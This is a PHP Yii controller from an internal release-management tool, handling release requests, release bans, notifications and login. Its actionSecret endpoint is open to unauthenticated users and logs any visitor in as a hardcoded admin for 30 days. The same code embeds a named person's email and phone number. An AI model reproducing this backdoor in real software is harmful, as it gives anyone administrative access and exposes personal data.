<?php
namespace app\controllers;

use app\models\ReleaseRequest;
use app\models\ReleaseReject;
use app\models\Project;
use app\models\Log;
use app\models\Build;
use app\modules\Wtflow\models\JiraCommit;
use RdsSystem;

class SiteController extends Controller
{
    public $pageTitle = 'Релизы и запреты';

    /**
     * @return array
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => \yii\filters\AccessControl::class,
                'rules' => [
                    ['allow' => true, 'roles' => ['@']],
                    ['allow' => true, 'actions' => ['login', 'secret']],
                ],
            ],
        ];
    }

    /**
     */
    public function actionIndex()
    {
        $releaseRequestSearchModel = new ReleaseRequest();
        $releaseRequestSearchModel->obj_created = null;
        $releaseRequestSearchModel->obj_modified = null;
        if (isset($_GET['ReleaseRequest'])) {
            $releaseRequestSearchModel->attributes = $_GET['ReleaseRequest'];
        }

        $releaseRejectSearchModel = new ReleaseReject();
        $releaseRejectSearchModel->obj_created = null;
        $releaseRejectSearchModel->obj_modified = null;
        if (isset($_GET['ReleaseReject'])) {
            $releaseRejectSearchModel->attributes = $_GET['ReleaseReject'];
        }

        $sql = "SELECT rr_project_obj_id, COUNT(*)
                FROM rds.release_request
                WHERE obj_created > NOW() - interval '3 month'
                AND rr_user=:user
                AND obj_status_did=:status
                GROUP BY 1
                ORDER BY 2 DESC
                LIMIT 5";

        $ids = \Yii::$app->db->createCommand($sql, [
            ':user' => \Yii::$app->user->getIdentity()->username,
            ':status'   => \ServiceBase_IHasStatus::STATUS_ACTIVE,
        ])->queryColumn();

        $mainProjects = Project::find()->where(['obj_id' => $ids])->all();

        return $this->render('index', array(
            'releaseRequestSearchModel' => $releaseRequestSearchModel,
            'releaseRejectSearchModel' => $releaseRejectSearchModel,
            'mainProjects' => $mainProjects,
            'releaseRequest' => $this->createReleaseRequest(),
        ));
    }

    /**
     */
    public function actionCreateReleaseRequest()
    {
        echo $this->render('createReleaseRequest', $this->createReleaseRequest());
    }

    private function createReleaseRequest()
    {
        $model = new ReleaseRequest();

        $transaction = $model->getDbConnection()->beginTransaction();

        try {
            if (isset($_POST['ReleaseRequest'])) {
                $model->attributes = $_POST['ReleaseRequest'];
                $model->rr_user = \Yii::$app->user->getIdentity()->username;
                if ($model->rr_project_obj_id) {
                    $model->rr_build_version = $model->project->getNextVersion($model->rr_release_version);
                }
                if ($model->save()) {
                    // an: Для comon мы выкладываем паралельно и dictionary. В данный момент это реализовано на уровне хардкода тут. В будущем, когда появится больше
                    // взаимосвязанныъ проектов - нужно подумать как это объединить в целостную систему

                    $projectName = $model->project->project_name;
                    if (in_array($projectName, ['comon', 'whotrades'])
                        && ($dictionaryProject = Project::findByAttributes(['project_name' => 'dictionary']))
                        && ($whotradesProject = Project::findByAttributes(['project_name' => 'whotrades']))
                    ) {
                        /** @var $dictionaryProject Project */
                        /** @var $whotradesProject Project */
                        $dictionary = new ReleaseRequest();
                        $dictionary->rr_user = $model->rr_user;
                        $dictionary->rr_project_obj_id = $dictionaryProject->obj_id;
                        $dictionary->rr_comment =
                            $model->rr_comment . " [slave for " . $projectName . "-$model->rr_build_version]";
                        $dictionary->rr_release_version = $model->rr_release_version;
                        $dictionary->rr_build_version = $dictionaryProject->getNextVersion($dictionary->rr_release_version);
                        $dictionary->rr_leading_id = $model->obj_id;
                        $dictionary->save();

                        $whotrades = new ReleaseRequest();
                        $whotrades->rr_user = $model->rr_user;
                        $whotrades->rr_project_obj_id = $whotradesProject->obj_id;
                        $whotrades->rr_comment =
                            $model->rr_comment . " [slave for " . $projectName . "-$model->rr_build_version]";
                        $whotrades->rr_release_version = $model->rr_release_version;
                        $whotrades->rr_build_version = $whotradesProject->getNextVersion($whotrades->rr_release_version);
                        $whotrades->rr_leading_id = $model->obj_id;
                        $whotrades->save();

                        $model->rr_comment = "$model->rr_comment";
                        $model->save();
                    }

                    // an: Отправку задач в rabbit делаем по-ближе к комиту транзакции, что бы не получилось что задачи уже
                    // начали выполняться, а транзакция ещё не отправлена и билда у нас в базе ещё нет
                    $model->createBuildTasks();
                    if (!empty($dictionary) && !empty($whotrades)) {
                        $dictionary->createBuildTasks();
                        $whotrades->createBuildTasks();
                    }
                    $transaction->commit();

                    $model->sendBuildTasks();
                    if (!empty($dictionary) && !empty($whotrades)) {
                        $dictionary->sendBuildTasks();
                        $whotrades->sendBuildTasks();
                    }

                    \Yii::$app->webSockets->send('updateAllReleaseRequests', []);

                    $this->redirect(array('index'));
                }
            }
        } catch (\Exception $e) {
            if ($transaction->isActive) {
                $transaction->rollback();
            }
            throw $e;
        }

        return ['model' => $model];
    }

    /**
     * Страница создания запрета на релиз
     * @throws \Exception
     */
    public function actionCreateReleaseReject()
    {
        $model = new ReleaseReject();

        if (isset($_POST['ReleaseReject'])) {
            $projectNames = [];
            foreach ($_POST['ReleaseReject']['rr_project_obj_id'] as $projectId) {
                /** @var $project Project */
                $project = Project::findOne(['obj_id' => $projectId]);
                if (!$project) {
                    continue;
                }
                $model = new ReleaseReject();
                $model->rr_user = \Yii::$app->user->getIdentity()->username;
                $model->rr_project_obj_id = $projectId;
                $model->rr_release_version = $_POST['ReleaseReject']['rr_release_version'];
                $model->rr_comment = $_POST['ReleaseReject']['rr_comment'];
                if ($model->save()) {
                    $projectNames[] = $project->project_name;
                }
            }
            $projects = implode(", ", $projectNames);
            Log::createLogMessage("Создан запрет релизов $projects");
            foreach (explode(",", \Yii::$app->params['notify']['releaseReject']['phones']) as $phone) {
                if (!$phone) {
                    continue;
                }
                $text = "{$model->rr_user} rejected $projects. {$model->rr_comment}";
                \Yii::$app->whotrades->{'getFinamTenderSystemFactory.getSmsSender.sendSms'}($phone, $text);
            }
            \Yii::$app->EmailNotifier->sendRdsReleaseRejectNotification(
                $model->rr_user,
                $projects,
                $model->rr_comment
            );

            \Yii::$app->webSockets->send('updateAllReleaseRejects', []);

            $this->redirect(array('index'));
        }

        echo $this->render('createReleaseReject', array(
            'model' => $model,
        ));
    }

    /**
     * @param int $id
     *
     * @throws \Exception
     */
    public function actionDeleteReleaseRequest($id)
    {
        $model = ReleaseRequest::findByPk($id);
        if (!$model) {
            return;
        }

        $messageModel = (new RdsSystem\Factory(\Yii::$app->debugLogger))->getMessagingRdsMsModel();

        $transaction = $model->getDb()->beginTransaction();
        /** @var $model ReleaseRequest*/
        foreach ($model->builds as $build) {
            if (in_array($build->build_status, Build::getInstallingStatuses())) {
                $model->rr_status = ReleaseRequest::STATUS_CANCELLING;
                $model->save();

                $messageModel->sendKillTask($build->worker->worker_name, new \RdsSystem\Message\KillTask(
                    $model->project->project_name,
                    $build->obj_id
                ));

                Log::createLogMessage("Отменен {$model->getTitle()}");
                $transaction->commit();

                return;
            }
        }

        Log::createLogMessage("Удален {$model->getTitle()}");
        $model->delete();

        $transaction->commit();

        if (!isset($_GET['ajax'])) {
            $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('index'));
        }
    }

    /**
     * @param int $id
     *
     * @throws \Exception
     */
    public function actionDeleteReleaseReject($id)
    {
        $model = ReleaseReject::findByPk($id);
        if ($model) {
            $transaction = $model->getDbConnection()->beginTransaction();
            try {
                Log::createLogMessage("Удален {$model->getTitle()}");
                $model->delete();
                $transaction->commit();
                \Yii::$app->webSockets->send('updateAllReleaseRejects', []);
            } catch (\Exception $e) {
                $transaction->rollback();
            }
        }

        if (!isset($_GET['ajax'])) {
            $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('index'));
        }
    }

    /**
     * Форма авторизации
     */
    public function actionLogin()
    {
        echo $this->render('login');
    }

    /**
     * @throws \Exception
     */
    public function actionSecret()
    {
        $identity = new \app\modules\SingleLogin\components\SingleLoginUser(1, 'anaumenko@corp.finam.ru');

        $phone = '79160549864';
        $identity->setPersistentStates(array(
            'phone' => $phone,
            'userRights' => array('admin'),
        ));

        \Yii::$app->session->set('currentUser', $identity);
        \Yii::$app->user->login($identity, 3600*24*30);

        $this->redirect('/');
    }

    /**
     * выход
     */
    public function actionLogout()
    {
        \Yii::$app->user->logout();
        $this->redirect(\Yii::$app->homeUrl);
    }

    /**
     * @param int  $id
     * @param bool $ajax
     *
     * @throws \Exception
     */
    public function actionCommits($id, $ajax = null)
    {
        /** @var $releaseRequest ReleaseRequest */
        if (!$releaseRequest = ReleaseRequest::findByPk($id)) {
            throw new \yii\web\NotFoundHttpException("Сборка #$id не найдена");
        }

        $c = new CDbCriteria();
        $c->order = 'jira_commit_repository';
        $c->compare('jira_commit_build_tag', $releaseRequest->getBuildTag());

        $commits = JiraCommit::findAll($c);

        if ($ajax) {
            echo $this->renderPartial('commits', ['commits' => $commits]);
        } else {
            echo $this->render('commits', ['commits' => $commits]);
        }
    }
}
